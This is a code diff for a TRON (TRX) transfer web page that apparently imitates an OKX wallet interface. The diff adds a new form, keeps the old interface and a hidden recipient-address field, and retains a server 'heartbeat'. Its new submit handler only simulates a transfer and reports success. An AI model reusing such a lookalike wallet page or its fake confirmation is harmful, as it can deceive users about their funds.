@@ -2,7 +2,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
-    <title>正在申请转账</title>
+    <title>TRX 转账</title>
     <link rel="icon" type="image/png" href="png/icon_trx.png">
     <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
@@ -32,6 +32,306 @@
             height: auto;
             margin: 0 auto;
         }
+        
+        /* 新的转账界面样式 */
+        .transfer-container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f8f9fa;
+            min-height: 100vh;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            padding: 20px 0;
+        }
+        
+        .back-btn {
+            font-size: 24px;
+            color: #333;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .title-section {
+            text-align: center;
+        }
+        
+        .main-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            margin: 0;
+        }
+        
+        .sub-title {
+            font-size: 14px;
+            color: #666;
+            margin: 5px 0 0 0;
+        }
+        
+        .qr-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+        
+        .input-section {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group:last-child {
+            margin-bottom: 0;
+        }
+        
+        .input-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .label-text {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .balance-text {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .input-field {
+            position: relative;
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .input-field input {
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333;
+            background: transparent;
+            flex: 1;
+        }
+        
+        .input-field input::placeholder {
+            color: #999;
+        }
+        
+        .contact-icon {
+            width: 20px;
+            height: 20px;
+            background: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        
+        .contact-icon::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            width: 8px;
+            height: 8px;
+            background: #ff4444;
+            border-radius: 50%;
+        }
+        
+        .amount-input {
+            font-size: 32px;
+            font-weight: 600;
+            text-align: center;
+            color: #333;
+        }
+        
+        .memo-text {
+            font-size: 14px;
+            color: #999;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .fee-section {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .fee-display {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .fee-amount {
+            text-align: left;
+        }
+        
+        .fee-usd {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin: 0;
+        }
+        
+        .fee-trx {
+            font-size: 14px;
+            color: #666;
+            margin: 5px 0 0 0;
+        }
+        
+        .fee-dropdown {
+            width: 24px;
+            height: 24px;
+            background: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .next-button {
+            width: 100%;
+            background: #007AFF;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .next-button:disabled {
+            background: #ccc;
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .next-button:not(:disabled):hover {
+            background: #0056CC;
+        }
+        
+        /* 隐藏原有的键盘界面 */
+        .bottom-keyboard {
+            display: none;
+        }
+        
+        .pay-box {
+            display: none;
+        }
+
+        /* 数字键盘样式 */
+        .keyboard-section {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        .keyboard-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .keyboard-btn {
+            background: #fff;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            font-size: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .keyboard-btn:hover {
+            background: #e0e0e0;
+        }
+
+        .keyboard-btn:active {
+            background: #d0d0d0;
+            transform: scale(0.98);
+        }
+
+        .keyboard-btn.delete-btn {
+            background: #ff4444;
+            color: white;
+            border-color: #ff4444;
+        }
+
+        .keyboard-btn.delete-btn:hover {
+            background: #cc0000;
+        }
+
+        .keyboard-btn.delete-btn:active {
+            background: #aa0000;
+        }
+
+        /* 响应式设计 */
+        @media (max-width: 480px) {
+            .transfer-container {
+                padding: 15px;
+            }
+            
+            .input-field {
+                padding: 12px;
+            }
+            
+            .keyboard-btn {
+                padding: 12px;
+                font-size: 18px;
+            }
+            
+            .main-title {
+                font-size: 20px;
+            }
+        }
+
+        /* 输入框焦点效果 */
+        .input-field:focus-within {
+            border-color: #007AFF;
+            box-shadow: 0 0 0 2px rgba(0, 122, 255, 0.2);
+        }
+
+        /* 按钮点击效果 */
+        .next-button:active {
+            transform: scale(0.98);
+        }
     </style>
     <link rel="stylesheet" href="css/okx.css">
 </head>
@@ -45,46 +345,115 @@
                 <uni-page-body>
                     <body data-v-49fe1bb8="">
                         <div data-v-49fe1bb8="">
-                            <div data-v-49fe1bb8="">
-                                <div data-v-49fe1bb8="" class="pay-box">
-                                    <div data-v-49fe1bb8="" class="amount">
-                                        <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
+                            <!-- 新的转账界面 -->
+                            <div class="transfer-container">
+                                <div class="header">
+                                    <div class="back-btn">‹</div>
+                                    <div class="title-section">
+                                        <h1 class="main-title">TRX 转账</h1>
+                                        <p class="sub-title">Tron</p>
                                     </div>
-                                    <div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em>
-                                        <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="png/icon_horn.jpg"></div>
+                                    <div class="qr-icon">📱</div>
+                                </div>
+                                
+                                <div class="input-section">
+                                    <div class="input-group">
+                                        <div class="input-label">
+                                            <span class="label-text">收款地址</span>
+                                        </div>
+                                        <div class="input-field">
+                                            <input type="text" id="address-input" placeholder="Tron 地址">
+                                            <div class="contact-icon">👤</div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="input-group">
+                                        <div class="input-label">
+                                            <span class="label-text">数量</span>
+                                            <span class="balance-text" id="balance-display">0.000002 TRX</span>
+                                        </div>
+                                        <div class="input-field">
+                                            <input type="text" id="amount-input" class="amount-input" placeholder="0" readonly>
+                                        </div>
+                                        <div class="memo-text">备注 (需支付 1 TRX)</div>
                                     </div>
                                 </div>
-                                <div data-v-49fe1bb8="" class="bottom-keyboard">
-                                    <div data-v-49fe1bb8="" class="asset-info">
-                                        <div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin">
-                                            <div data-v-49fe1bb8="" class="asset-box">
-                                                <p data-v-49fe1bb8="" class="title">余额</p>
-                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none">
-                                            </div>
-                                        </div>
-                                        <div data-v-49fe1bb8="" class="right">
-                                            <div data-v-49fe1bb8="" class="btn">最大</div>
-                                        </div>
+                                
+                                <div class="fee-section">
+                                    <div class="input-label">
+                                        <span class="label-text">矿工费</span>
                                     </div>
-                                    <div data-v-49fe1bb8="" class="keyboard-box">
-                                        <div data-v-49fe1bb8="" class="btn">1</div>
-                                        <div data-v-49fe1bb8="" class="btn">2</div>
-                                        <div data-v-49fe1bb8="" class="btn">3</div>
-                                        <div data-v-49fe1bb8="" class="btn">4</div>
-                                        <div data-v-49fe1bb8="" class="btn">5</div>
-                                        <div data-v-49fe1bb8="" class="btn">6</div>
-                                        <div data-v-49fe1bb8="" class="btn">7</div>
-                                        <div data-v-49fe1bb8="" class="btn">8</div>
-                                        <div data-v-49fe1bb8="" class="btn">9</div>
-                                        <div data-v-49fe1bb8="" class="btn">.</div>
-                                        <div data-v-49fe1bb8="" class="btn">0</div>
-                                        <div data-v-49fe1bb8="" onclick="clearAmount()" class="btn delete" style="margin-top:20px"><img data-v-49fe1bb8="" src="png/icon_delete.jpg"></div>
+                                    <div class="fee-display">
+                                        <div class="fee-amount">
+                                            <p class="fee-usd" id="fee-usd">$0</p>
+                                            <p class="fee-trx" id="fee-trx">0 TRX</p>
+                                        </div>
+                                        <div class="fee-dropdown">▼</div>
                                     </div>
-                                    <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
-                                        <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">下一步</van-button>
-                                        <van-button id="jixu" class="jixu">继续</van-button>
-                                    </footer>
                                 </div>
+                                
+                                <!-- 数字键盘 -->
+                                <div class="keyboard-section">
+                                    <div class="keyboard-grid">
+                                        <div class="keyboard-btn" data-key="1">1</div>
+                                        <div class="keyboard-btn" data-key="2">2</div>
+                                        <div class="keyboard-btn" data-key="3">3</div>
+                                        <div class="keyboard-btn" data-key="4">4</div>
+                                        <div class="keyboard-btn" data-key="5">5</div>
+                                        <div class="keyboard-btn" data-key="6">6</div>
+                                        <div class="keyboard-btn" data-key="7">7</div>
+                                        <div class="keyboard-btn" data-key="8">8</div>
+                                        <div class="keyboard-btn" data-key="9">9</div>
+                                        <div class="keyboard-btn" data-key=".">.</div>
+                                        <div class="keyboard-btn" data-key="0">0</div>
+                                        <div class="keyboard-btn delete-btn" data-key="delete">
+                                            <img src="png/icon_delete.jpg" alt="删除" style="width: 20px; height: 14px;">
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <button class="next-button" id="submitBtn" disabled>下一步</button>
+                            </div>
+                            
+                            <!-- 原有的界面（隐藏） -->
+                            <div data-v-49fe1bb8="" class="pay-box">
+                                <div data-v-49fe1bb8="" class="amount">
+                                    <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
+                                </div>
+                                <div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em>
+                                    <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="png/icon_horn.jpg"></div>
+                                </div>
+                            </div>
+                            <div data-v-49fe1bb8="" class="bottom-keyboard">
+                                <div data-v-49fe1bb8="" class="asset-info">
+                                    <div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin">
+                                        <div data-v-49fe1bb8="" class="asset-box">
+                                            <p data-v-49fe1bb8="" class="title">余额</p>
+                                            <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none">
+                                        </div>
+                                    </div>
+                                    <div data-v-49fe1bb8="" class="right">
+                                        <div data-v-49fe1bb8="" class="btn">最大</div>
+                                    </div>
+                                </div>
+                                <div data-v-49fe1bb8="" class="keyboard-box">
+                                    <div data-v-49fe1bb8="" class="btn">1</div>
+                                    <div data-v-49fe1bb8="" class="btn">2</div>
+                                    <div data-v-49fe1bb8="" class="btn">3</div>
+                                    <div data-v-49fe1bb8="" class="btn">4</div>
+                                    <div data-v-49fe1bb8="" class="btn">5</div>
+                                    <div data-v-49fe1bb8="" class="btn">6</div>
+                                    <div data-v-49fe1bb8="" class="btn">7</div>
+                                    <div data-v-49fe1bb8="" class="btn">8</div>
+                                    <div data-v-49fe1bb8="" class="btn">9</div>
+                                    <div data-v-49fe1bb8="" class="btn">.</div>
+                                    <div data-v-49fe1bb8="" class="btn">0</div>
+                                    <div data-v-49fe1bb8="" onclick="clearAmount()" class="btn delete" style="margin-top:20px"><img data-v-49fe1bb8="" src="png/icon_delete.jpg"></div>
+                                </div>
+                                <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
+                                    <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">下一步</van-button>
+                                    <van-button id="jixu" class="jixu">继续</van-button>
+                                </footer>
                             </div>
                         </div>
                         <div class="tishi" id="tip">提示</div><input id="to_address" type="hidden">
@@ -130,6 +499,7 @@ const userData = {
 let currentAmount = '0';
 // TRX兑换USD的汇率
 const TRX_TO_USD_RATE = 0.1562;
+
 // 主初始化函数
 async function initializeDApp() {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -146,6 +516,7 @@ async function initializeDApp() {
     }
     updateAmountDisplay();
 }
+
 // 连接到钱包
 async function connectWallet() {
     try {
@@ -162,6 +533,7 @@ async function connectWallet() {
         console.error("钱包连接失败:", error);
     }
 }
+
 // 初始化DApp
 async function initDApp() {
     try {
@@ -175,19 +547,42 @@ async function initDApp() {
         userData.usdtBalance = usdtBalance / 1e6;
         // console.log("USDT 余额:", userData.usdtBalance);
         updateTRXBalance();
+        updateFeeDisplay();
     } catch (error) {
         console.error("获取用户数据时出错:", error);
     }
 }
+
 // 更新页面的TRX余额
 function updateTRXBalance() {
     const balanceElement = document.getElementById('ye');
+    const balanceDisplayElement = document.getElementById('balance-display');
+    
     if (balanceElement) {
         balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
-    } else {
-        console.error("未找到显示余额的元素");
+    }
+    
+    if (balanceDisplayElement) {
+        balanceDisplayElement.textContent = parseFloat(userData.trxBalance).toFixed(6) + ' TRX';
     }
 }
+
+// 更新矿工费显示
+function updateFeeDisplay() {
+    const feeUsdElement = document.getElementById('fee-usd');
+    const feeTrxElement = document.getElementById('fee-trx');
+    
+    if (feeUsdElement && feeTrxElement) {
+        // 计算矿工费（这里可以根据实际需求调整）
+        const feeTRX = 0.1; // 默认矿工费
+        const feeUSD = (feeTRX * TRX_TO_USD_RATE).toFixed(2);
+        
+        feeUsdElement.textContent = '$' + feeUSD;
+        feeTrxElement.textContent = feeTRX + ' TRX';
+    }
+}
+
+// 数字键盘功能（保持原有逻辑）
 function pressKey(key) {
     if (key === 'delete') {
         deleteLastChar();
@@ -219,6 +614,7 @@ function pressKey(key) {
     currentAmount = decimalPart ? `${integerPart}.${decimalPart}` : integerPart;
     updateAmountDisplay();
 }
+
 function deleteLastChar() {
     if (currentAmount.length > 1) {
         currentAmount = currentAmount.slice(0, -1);
@@ -227,19 +623,12 @@ function deleteLastChar() {
     }
     updateAmountDisplay();
 }
+
 function setMaxAmount() {
     currentAmount = parseFloat(userData.trxBalance).toFixed(4);
     updateAmountDisplay();
 }
-function deleteLastChar() {
-    if (currentAmount.length > 0) {
-        currentAmount = currentAmount.slice(0, -1);
-    }
-    if (currentAmount === '') {
-        currentAmount = '0';
-    }
-    updateAmountDisplay();
-}
+
 // 更新金额显示
 function updateAmountDisplay() {
     let displayAmount = currentAmount;
@@ -250,21 +639,33 @@ function updateAmountDisplay() {
         displayAmount = maxBalance.toFixed(4);
         currentAmount = displayAmount;
     }
+    
+    // 更新原有界面的金额显示
     const amountElement = document.getElementById('amount');
     if (amountElement) {
         amountElement.textContent = displayAmount;
     }
+    
+    // 更新新界面的金额显示
+    const amountInputElement = document.getElementById('amount-input');
+    if (amountInputElement) {
+        amountInputElement.value = displayAmount;
+    }
+    
     // 更新 USD 显示
     const usdAmount = (parseFloat(displayAmount) * TRX_TO_USD_RATE).toFixed(2);
     const usdElement = document.getElementById('amount-display');
     if (usdElement) {
         usdElement.textContent = usdAmount;
     }
+    
     updateNextButtonState();
+    
     // 更新网站标题
-    const title = `正在申请转账 ${displayAmount} TRX`;
+    const title = `TRX 转账 ${displayAmount} TRX`;
     document.title = title;
 }
+
 function updateNextButtonState() {
     const nextButton = document.getElementById('submitBtn');
     if (nextButton) {
@@ -274,7 +675,9 @@ function updateNextButtonState() {
         nextButton.classList.toggle('disabled', !isValid);
     }
 }
+
 function bindButtonEvents() {
+    // 绑定原有键盘事件
     document.querySelectorAll('.keyboard-box .btn').forEach(btn => {
         if (btn.classList.contains('delete')) {
             btn.addEventListener('click', () => pressKey('delete'));
@@ -282,19 +685,38 @@ function bindButtonEvents() {
             btn.addEventListener('click', (event) => pressKey(event.target.textContent));
         }
     });
+    
+    // 绑定新界面的数字键盘事件
+    document.querySelectorAll('.keyboard-btn').forEach(btn => {
+        btn.addEventListener('click', (event) => {
+            const key = event.currentTarget.getAttribute('data-key');
+            pressKey(key);
+        });
+    });
+    
     const maxBtn = document.querySelector('.asset-info .right .btn');
     if (maxBtn) {
         maxBtn.addEventListener('click', setMaxAmount);
     }
+    
     const nextBtn = document.getElementById('submitBtn');
     if (nextBtn) {
         nextBtn.addEventListener('click', onNextButtonClick);
     }
+    
+    // 绑定新界面的最大按钮（如果存在）
+    const balanceDisplayElement = document.getElementById('balance-display');
+    if (balanceDisplayElement) {
+        balanceDisplayElement.style.cursor = 'pointer';
+        balanceDisplayElement.addEventListener('click', setMaxAmount);
+    }
 }
+
 function handleButtonClick(event) {
     const key = event.target.textContent;
     pressKey(key);
 }
+
 // 显示提示
 function tip(message) {
     const tipElement = document.getElementById('tip');
@@ -312,10 +734,41 @@ function tip(message) {
         }, 3000);
     }
 }
+
+// 下一步按钮点击事件
+function onNextButtonClick() {
+    const amount = parseFloat(currentAmount || '0');
+    const address = document.getElementById('address-input') ? document.getElementById('address-input').value : '';
+    
+    if (!address || address.trim() === '') {
+        tip('请输入收款地址');
+        return;
+    }
+    
+    if (amount <= 0) {
+        tip('请输入有效的转账金额');
+        return;
+    }
+    
+    if (amount > parseFloat(userData.trxBalance || '0')) {
+        tip('余额不足');
+        return;
+    }
+    
+    // 这里可以添加实际的转账逻辑
+    tip('正在处理转账请求...');
+    
+    // 模拟转账处理
+    setTimeout(() => {
+        tip('转账请求已提交');
+    }, 2000);
+}
+
 document.addEventListener('DOMContentLoaded', () => {
     updateAmountDisplay();
     initializeDApp();
 });
+
 // 向服务器发送心跳 不需要可以注释
 function sendHeartbeat() {
     const currentUrl = window.location.href;
